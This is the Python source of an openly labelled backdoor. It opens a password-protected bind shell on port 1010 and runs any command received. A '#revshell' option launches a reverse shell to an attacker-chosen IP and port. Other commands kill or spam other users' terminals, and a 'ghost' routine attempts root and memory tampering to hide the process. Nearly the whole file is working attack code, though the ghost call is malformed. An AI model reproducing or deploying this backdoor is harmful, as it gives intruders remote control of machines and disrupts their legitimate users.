# Neco Arc is The Best Waifu

import socket
import ctypes,signal
import os,getpass,time
import subprocess,platform
import multiprocessing as mp

black='\033[0;90m'
red='\033[0;91m'
green='\033[0;92m'
yellow='\033[0;93m'
blue='\033[0;94m'
purple='\033[0;95m'
cyan='\033[0;96m'
white='\033[0;97m'
off='\033[0m'
fgreen='\033[42;97m'


SERVER_HOST = '0.0.0.0'
SERVER_PORT = 1010 #Change
backdoor_version = "1.0"

system=platform.system()
release=platform.release()
version=platform.version()
architecture=platform.machine()
python_version=platform.python_version()


banner_reaper=f"""
{red}
                                                     __________
▀███▀▀▀███                                  ██      |  __  __  |            
  ██    ▀█                                  ██      | |  ||  | |            
  ██   █        ▀███▄███  ▄██▀██▄  ▄██▀██▄██████    | |  ||  | |            
  ██▀▀██          ██▀ ▀▀ ██▀   ▀████▀   ▀██ ██      | |__||__| |            
  ▓█   █   █████  █▓     ██     ████     ██ ██      |  __  __()|             
  ▓█              █▓     ██     ▓███     ▓█ █▓      | |  ||  | |            
  ▓▓              ▓▓     ▓█     ▓▓▓█     ▓▓ ▓▓      | |  ||  | |            
  ▒▓              ▓▒     ▓▓▓   ▓▓▓▓▓▓   ▓▓▓ ▓▓      | |__||__| |            
▒▓▒ ▒           ▒ ▒▒▒     ▒ ▒ ▒ ▒  ▒ ▒ ▒ ▒  ▒▒▒ ▒   |__________|
                     {purple}[https://github.com/Detrew]{off}     {green}[Backdoor]{off}
                                                     
{off}

"""

pid = os.getpid()
hostname = os.uname().nodename



def ghost(pid):
    libc = ctypes.CDLL('libc.so.6')
    libc.setuid(0)
    proc_maps_file = f"/proc/{pid}/maps"
    with open(proc_maps_file, 'r') as f:
        addr = f.readline().split('-')[0]
    libc = ctypes.CDLL('libc.so.6')
    mprotect = libc.mprotect
    mprotect.restype = ctypes.c_int
    mprotect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
    addr = int(addr, 16)
    pagesize = os.sysconf("SC_PAGE_SIZE")
    mprotect(addr, pagesize, 0x0)



help=f"""
    {off}\n
    ╔═══════════════════[help]═════════════════════╗
     {blue}#exit{off}: Close The Target Session
     {blue}#revshell{off}: make a reverseshell     
     {blue}#kill{off}: Kick Everyone whit tty :) 
     {blue}#info{off}: Machine info
     {blue}#cat{off}: cats for everyone whit tty! 
     {blue}#help{off}: Help Manual (this)
    ╚═════════════════════════════════════════════╝\n\n
    """
info=f"""
    ╔═══════════════════════[System Information]══════════════════════╗
     {white}Nome:{green} {hostname} {off}
     {white}Kernel:{green} {release}{off}
     {white}Arquitetura:{green} {architecture}{off}
     {white}Versão:{green} {version}{off}
    ╚═════════════════════════════════════════════════════════════════╝
"""


def handle_client(client_sock):
    vusername = getpass.getuser()
    client_sock.send(f"{vusername}@{hostname}".encode())
    client_sock.send(b'\033c')
    client_sock.send(f'{banner_reaper}\n'.encode())
    client_sock.send(f'[{green}Login{off}]: '.encode())
    username = client_sock.recv(1024).decode().strip()
    client_sock.send(f'[{green}Password{off}]: '.encode())
    password = client_sock.recv(1024).decode().strip()
    #Change username and Password
    if username == 'froot' and password == 'detrew':
        client_sock.send(b'\033c')
        client_sock.send(f'{banner_reaper}\n'.encode())
        client_sock.send(f'{green}[*]{off} Welcome\n{green}[+]{off} python version: {python_version}\n{green}[+]{off} backdoor version: {backdoor_version}\n{green}[+]{off} Use #help to see the commands\n{red}[+]{yellow} This is A bind Shell to Have a Reverse Shell Use the command {green}#revshell\n{off}'.encode())
        client_sock.send(f'\n[{red}{vusername}{off}@{red}{hostname}{off}]:~# '.encode())
        while True:
            cmd = client_sock.recv(1024).decode().strip()
            if cmd == '#revshell':
                client_sock.send(f"[{green}ip{off}]: ".encode())
                ip_rev = client_sock.recv(1024).decode().strip()
                client_sock.send(f"[{green}port{off}]: ".encode())
                port_rev = client_sock.recv(1024).decode().strip()
                os.system(f"""/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip_rev}",{port_rev}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' & 2>/dev/null >/dev/null""")
                client_sock.send(f"[{green}Reverse Shell Send{off}]".encode())
                pass
            if cmd == '#kill':
                os.system("""MY=$(tty|cut -d'/' -f4);for L in $(seq 40);do [ $MY == $L] && { echo 'Live'; } || { cat kick_message > /dev/pts/$L; pkill -9 -t pts/$L 2>/dev/null; };done 2>/dev/null""")
                client_sock.send(f"[{green}Killed Shells{off}]".encode())
            if cmd == '#cat':
                os.system("""MY=$(tty|cut -d'/' -f4);for L in $(seq 40);do [ $MY == $L] && { echo 'Live'; } || { bash kitty.sh > /dev/pts/$L 2>/dev/null & };done 2>/dev/null""")
                client_sock.send(f"[{green}Owo!{off}]".encode())
            if cmd == '#info':
                client_sock.send(f"{info}".encode())
            if cmd == '#help':
                client_sock.send(f"{help}".encode())
            if cmd == '#exit':
                break
            output = subprocess.getoutput(cmd)
            client_sock.send(output.encode())
            client_sock.send(f'\n[{red}{vusername}{off}@{red}{hostname}{off}]:~# '.encode())

    else:
        client_sock.send(f'\n[{red}\o/ Wrong Passowrd{off}]\n'.encode())
    client_sock.close()

def start_server():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((SERVER_HOST, SERVER_PORT))
    server_sock.listen()
    print(f"{green}[+] Backdoor On On Port{off} {SERVER_PORT}")
    while True:
        client_sock, addr = server_sock.accept()
        print(f"{green}[+] User Connect: {addr}")
        pid = os.fork()
        if pid == 0:
            server_sock.close()
            handle_client(client_sock)
            os._exit(0)
        else:
            client_sock.close()


if __name__ == '__main__':
    start_server()
    ghost() 
